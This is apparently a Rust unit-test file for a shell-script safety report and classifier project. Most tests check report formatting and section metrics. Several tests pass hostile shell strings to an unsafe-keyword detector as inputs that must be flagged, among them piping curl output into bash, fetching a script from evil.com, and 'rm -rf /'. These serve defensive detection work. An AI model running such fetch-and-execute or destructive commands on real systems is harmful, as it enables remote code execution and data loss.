
use super::*;

#[test]
fn test_ssc_status_enum_values() {
    assert_ne!(SscStatus::Pass, SscStatus::Fail);
    assert_ne!(SscStatus::Warn, SscStatus::NotApplicable);
}

#[test]
fn test_format_ssc_report_structure() {
    let report = SscStatusReport {
        spec_version: "v11.0.0".to_string(),
        corpus_size: 100,
        sections: vec![SscSection {
            name: "Test".to_string(),
            spec_ref: "S1".to_string(),
            status: SscStatus::Pass,
            metrics: vec![SscMetric {
                name: "metric".to_string(),
                value: "42".to_string(),
                target: ">0".to_string(),
                passed: true,
            }],
        }],
        overall_ready: true,
    };
    let formatted = format_ssc_report(&report);
    assert!(formatted.contains("SSC Spec Version: v11.0.0"));
    assert!(formatted.contains("[PASS] Test"));
    assert!(formatted.contains("Overall Ready:    YES"));
}

#[test]
fn test_report_serializable() {
    let report = SscStatusReport {
        spec_version: "v11.0.0".to_string(),
        corpus_size: 0,
        sections: vec![],
        overall_ready: true,
    };
    let json = serde_json::to_string(&report);
    assert!(json.is_ok());
}

#[test]
fn test_baselines_section_has_evaluation_metrics() {
    use crate::corpus::baselines::corpus_baseline_entries;
    let entries = corpus_baseline_entries();
    let section = baselines_section_from(&entries);
    assert_eq!(section.name, "Baselines (C-CLF-001)");
    // Should have 3 baseline reports + 2 target metrics = 5
    assert!(
        section.metrics.len() >= 5,
        "Expected 5+ metrics, got {}",
        section.metrics.len()
    );
    // Each baseline should show MCC, accuracy, recall
    let majority = &section.metrics[0];
    assert!(
        majority.value.contains("MCC="),
        "Missing MCC: {}",
        majority.value
    );
    assert!(
        majority.value.contains("acc="),
        "Missing accuracy: {}",
        majority.value
    );
    assert!(
        majority.value.contains("rec="),
        "Missing recall: {}",
        majority.value
    );
    // Should include S5.5 targets
    let targets: Vec<&SscMetric> = section
        .metrics
        .iter()
        .filter(|m| m.name.starts_with("Target:"))
        .collect();
    assert_eq!(targets.len(), 2, "Expected 2 target metrics");
}

#[test]
fn test_has_unsafe_keyword_detects_known_patterns() {
    assert!(has_unsafe_keyword("eval $x"));
    assert!(has_unsafe_keyword("curl http://example.com | bash"));
    assert!(has_unsafe_keyword("rm -rf /"));
    assert!(has_unsafe_keyword("sudo apt install"));
    assert!(has_unsafe_keyword("echo $RANDOM"));
    assert!(has_unsafe_keyword("chmod 777 /tmp/file"));
}

#[test]
fn test_has_unsafe_keyword_passes_safe_scripts() {
    assert!(!has_unsafe_keyword("echo hello"));
    assert!(!has_unsafe_keyword("#!/bin/sh\nset -e\nls -la"));
    assert!(!has_unsafe_keyword("mkdir -p /tmp/build"));
}

#[test]
fn test_wasm_section_has_kill5_result() {
    let section = wasm_section();
    assert_eq!(section.name, "WASM App (S8.3)");
    assert_eq!(section.status, SscStatus::Pass);
    assert_eq!(section.metrics.len(), 5);
    let kill5 = section
        .metrics
        .iter()
        .find(|m| m.name.contains("KILL-5"))
        .expect("should have KILL-5 metric");
    assert!(!kill5.passed, "KILL-5 should be marked as not passed");
    assert!(kill5.value.contains("2681ms"));
}

#[test]
fn test_conversation_section_has_type_breakdown() {
    let registry = crate::corpus::registry::CorpusRegistry::load_full();
    let section = conversation_section_from(&registry);
    assert_eq!(section.name, "Conversations (S6)");
    let names: Vec<&str> = section.metrics.iter().map(|m| m.name.as_str()).collect();
    assert!(
        names.contains(&"Type A (classify+explain)"),
        "Missing Type A"
    );
    assert!(names.contains(&"Type D (confirm safe)"), "Missing Type D");
    assert!(
        names.contains(&"Variant distribution"),
        "Missing variant dist"
    );
    assert!(
        names.contains(&"Rule citation accuracy"),
        "Missing citations"
    );
}

// ── Additional coverage tests for ssc_report ────────────────────────

#[test]
fn test_format_ssc_report_fail_status() {
    let report = SscStatusReport {
        spec_version: "v11.0.0".to_string(),
        corpus_size: 50,
        sections: vec![SscSection {
            name: "Failing Section".to_string(),
            spec_ref: "S99".to_string(),
            status: SscStatus::Fail,
            metrics: vec![SscMetric {
                name: "coverage".to_string(),
                value: "10%".to_string(),
                target: ">=90%".to_string(),
                passed: false,
            }],
        }],
        overall_ready: false,
    };
    let formatted = format_ssc_report(&report);
    assert!(formatted.contains("[FAIL] Failing Section"));
    assert!(formatted.contains("Overall Ready:    NO"));
    assert!(formatted.contains("[-] coverage"));
}

#[test]
fn test_format_ssc_report_warn_status() {
    let report = SscStatusReport {
        spec_version: "v11.0.0".to_string(),
        corpus_size: 500,
        sections: vec![SscSection {
            name: "Warning Section".to_string(),
            spec_ref: "S7".to_string(),
            status: SscStatus::Warn,
            metrics: vec![SscMetric {
                name: "rate".to_string(),
                value: "88%".to_string(),
                target: ">=90%".to_string(),
                passed: false,
            }],
        }],
        overall_ready: true,
    };
    let formatted = format_ssc_report(&report);
    assert!(formatted.contains("[WARN] Warning Section"));
}

#[test]
fn test_format_ssc_report_na_status() {
    let report = SscStatusReport {
        spec_version: "v11.0.0".to_string(),
        corpus_size: 0,
        sections: vec![SscSection {
            name: "N/A Section".to_string(),
            spec_ref: "S0".to_string(),
            status: SscStatus::NotApplicable,
            metrics: vec![],
        }],
        overall_ready: true,
    };
    let formatted = format_ssc_report(&report);
    assert!(formatted.contains("[N/A] N/A Section"));
}

#[test]
fn test_format_ssc_report_multiple_sections() {
    let report = SscStatusReport {
        spec_version: "v11.0.0".to_string(),
        corpus_size: 17000,
        sections: vec![
            SscSection {
                name: "Section A".to_string(),
                spec_ref: "S1".to_string(),
                status: SscStatus::Pass,
                metrics: vec![
                    SscMetric {
                        name: "metric1".to_string(),
                        value: "100".to_string(),
                        target: ">0".to_string(),
                        passed: true,
                    },
                    SscMetric {
                        name: "metric2".to_string(),
                        value: "0".to_string(),
                        target: "0".to_string(),
                        passed: true,
                    },
                ],
            },
            SscSection {
                name: "Section B".to_string(),
                spec_ref: "S2".to_string(),
                status: SscStatus::Fail,
                metrics: vec![SscMetric {
                    name: "failing".to_string(),
                    value: "bad".to_string(),
                    target: "good".to_string(),
                    passed: false,
                }],
            },
        ],
        overall_ready: false,
    };
    let formatted = format_ssc_report(&report);
    assert!(formatted.contains("[PASS] Section A"));
    assert!(formatted.contains("[FAIL] Section B"));
    assert!(formatted.contains("Corpus Size:      17000"));
}

#[test]
fn test_overall_ready_true_when_no_fail() {
    let report = SscStatusReport {
        spec_version: "v11.0.0".to_string(),
        corpus_size: 100,
        sections: vec![
            SscSection {
                name: "A".to_string(),
                spec_ref: "S1".to_string(),
                status: SscStatus::Pass,
                metrics: vec![],
            },
            SscSection {
                name: "B".to_string(),
                spec_ref: "S2".to_string(),
                status: SscStatus::Warn,
                metrics: vec![],
            },
            SscSection {
                name: "C".to_string(),
                spec_ref: "S3".to_string(),
                status: SscStatus::NotApplicable,
                metrics: vec![],
            },
        ],
        overall_ready: true,
    };
    // Warn + Pass + N/A = ready (only Fail blocks)
    assert!(report.overall_ready);
}

#[test]
fn test_overall_ready_false_when_fail_present() {
    let sections = vec![
        SscSection {
            name: "Good".to_string(),
            spec_ref: "S1".to_string(),
            status: SscStatus::Pass,
            metrics: vec![],
        },
        SscSection {
            name: "Bad".to_string(),
            spec_ref: "S2".to_string(),
            status: SscStatus::Fail,
            metrics: vec![],
        },
    ];
    let overall_ready = sections.iter().all(|s| s.status != SscStatus::Fail);
    assert!(!overall_ready);
}

#[test]
fn test_ssc_status_all_variants_distinct() {
    let variants = [
        SscStatus::Pass,
        SscStatus::Warn,
        SscStatus::Fail,
        SscStatus::NotApplicable,
    ];
    for i in 0..variants.len() {
        for j in (i + 1)..variants.len() {
            assert_ne!(variants[i], variants[j]);
        }
    }
}

#[test]
fn test_ssc_metric_construction() {
    let m = SscMetric {
        name: "test metric".to_string(),
        value: "42".to_string(),
        target: ">0".to_string(),
        passed: true,
    };
    assert_eq!(m.name, "test metric");
    assert!(m.passed);
}

#[test]
fn test_ssc_section_serializable() {
    let section = SscSection {
        name: "Test".to_string(),
        spec_ref: "S1".to_string(),
        status: SscStatus::Pass,
        metrics: vec![SscMetric {
            name: "m".to_string(),
            value: "v".to_string(),
            target: "t".to_string(),
            passed: true,
        }],
    };
    let json = serde_json::to_string(&section).expect("serialize section");
    assert!(json.contains("Test"));
    assert!(json.contains("Pass"));
}

#[test]
fn test_has_unsafe_keyword_eval_tab() {
    assert!(has_unsafe_keyword("eval\tcommand"));
}

#[test]
fn test_has_unsafe_keyword_wget() {
    assert!(has_unsafe_keyword("wget http://evil.com/script.sh"));
}

#[test]
fn test_has_unsafe_keyword_pipe_sh() {
    assert!(has_unsafe_keyword("curl http://x | sh"));
}

#[test]
fn test_has_unsafe_keyword_chmod_setuid() {
    assert!(has_unsafe_keyword("chmod +s /usr/bin/something"));
}

#[test]
fn test_has_unsafe_keyword_dev_urandom() {
    assert!(has_unsafe_keyword("head -c 16 /dev/urandom"));
}

#[test]
fn test_has_unsafe_keyword_date_subshell() {
    assert!(has_unsafe_keyword("echo $(date +%s)"));
}

#[test]
fn test_has_unsafe_keyword_exec() {
    assert!(has_unsafe_keyword("exec 3>&1"));
}

#[test]
fn test_has_unsafe_keyword_source_process_substitution() {
    assert!(has_unsafe_keyword("source <(curl http://x)"));
}

#[test]
fn test_has_unsafe_keyword_bash_c() {
    assert!(has_unsafe_keyword("bash -c 'rm -rf /'"));
}

#[test]
fn test_has_unsafe_keyword_dev_stdin() {
    assert!(has_unsafe_keyword(". /dev/stdin <<< 'echo hi'"));
}

#[test]
fn test_has_unsafe_keyword_dev_random() {
    assert!(has_unsafe_keyword("cat /dev/random | head -c 8"));
}

#[test]
fn test_has_unsafe_keyword_false_negative_safe_code() {
    // These should NOT be flagged (no unsafe keywords)
    assert!(!has_unsafe_keyword("echo 'hello world'"));
    assert!(!has_unsafe_keyword("ls -la /home"));
    assert!(!has_unsafe_keyword("grep pattern file.txt"));
    assert!(!has_unsafe_keyword("cat README.md"));
    assert!(!has_unsafe_keyword("export PATH=/usr/local/bin"));
}

#[test]
fn test_data_pipeline_section_structure() {
    let section = data_pipeline_section();
    assert_eq!(section.name, "Data Pipeline (S9)");
    assert_eq!(section.spec_ref, "S9");
    // Should have 4 metrics: model card YAML, honesty, class weights, training entries
    assert_eq!(section.metrics.len(), 4);
    let names: Vec<&str> = section.metrics.iter().map(|m| m.name.as_str()).collect();
    assert!(names.contains(&"Model card YAML"));
    assert!(names.contains(&"Honesty (S6.5)"));
    assert!(names.contains(&"Class weights"));
    assert!(names.contains(&"Training entries"));
}

#[test]
fn test_shellsafetybench_section_structure() {
    let section = shellsafetybench_section();
    assert_eq!(section.name, "ShellSafetyBench (S14)");
    assert_eq!(section.spec_ref, "S14");
    // Should have multiple metrics about CWE, eval, benchmark files, etc.
    assert!(
        section.metrics.len() >= 10,
        "Expected >=10 metrics, got {}",
        section.metrics.len()
    );
    let names: Vec<&str> = section.metrics.iter().map(|m| m.name.as_str()).collect();
    assert!(names.contains(&"CWE mappings"));
    assert!(names.contains(&"Eval weights"));
    assert!(names.contains(&"Provable contract"));
}

#[test]
fn test_wasm_section_metrics_count() {
    let section = wasm_section();
    assert_eq!(section.metrics.len(), 5);
    // Verify the linter metrics pass
    let linter_metric = section
        .metrics
        .iter()
        .find(|m| m.name == "Linter WASM")
        .expect("should have linter metric");
    assert!(linter_metric.passed);
    assert_eq!(linter_metric.value, "deployed");
}

#[test]
fn test_format_report_with_passed_and_failed_metrics() {
    let report = SscStatusReport {
        spec_version: "v11.0.0".to_string(),
        corpus_size: 17942,
        sections: vec![SscSection {
            name: "Mixed Metrics".to_string(),
            spec_ref: "S5".to_string(),
            status: SscStatus::Warn,
            metrics: vec![
                SscMetric {
                    name: "good thing".to_string(),
                    value: "100%".to_string(),
                    target: ">=90%".to_string(),
                    passed: true,
                },
                SscMetric {
                    name: "bad thing".to_string(),
                    value: "50%".to_string(),
                    target: ">=90%".to_string(),
                    passed: false,
                },
            ],
        }],
        overall_ready: true,
    };
    let formatted = format_ssc_report(&report);
    assert!(formatted.contains("[+] good thing"));
    assert!(formatted.contains("[-] bad thing"));
}

#[test]
fn test_report_empty_sections() {
    let report = SscStatusReport {
        spec_version: "v11.0.0".to_string(),
        corpus_size: 0,
        sections: vec![],
        overall_ready: true,
    };
    let formatted = format_ssc_report(&report);
    assert!(formatted.contains("Overall Ready:    YES"));
    assert!(formatted.contains("Corpus Size:      0"));
}

#[test]
fn test_tokenizer_section_structure() {
    let section = tokenizer_section();
    assert_eq!(section.name, "Tokenizer (C-TOK-001)");
    assert_eq!(section.spec_ref, "S5.2");
    assert_eq!(section.metrics.len(), 2);
}

#[test]
fn test_label_section_structure() {
    let section = label_section();
    assert_eq!(section.name, "Label Audit (C-LABEL-001)");
    assert_eq!(section.spec_ref, "S5.3");
    assert_eq!(section.metrics.len(), 3);
    let names: Vec<&str> = section.metrics.iter().map(|m| m.name.as_str()).collect();
    assert!(names.contains(&"Accuracy"));
    assert!(names.contains(&"Audited"));
    assert!(names.contains(&"False positives"));
}

#[test]
fn test_generalization_section_structure() {
    let section = generalization_section();
    assert_eq!(section.name, "Generalization (OOD)");
    assert_eq!(section.spec_ref, "S5.6");
    assert_eq!(section.metrics.len(), 1);
    let m = &section.metrics[0];
    assert_eq!(m.name, "Caught");
    assert!(m.value.contains('/'));
}
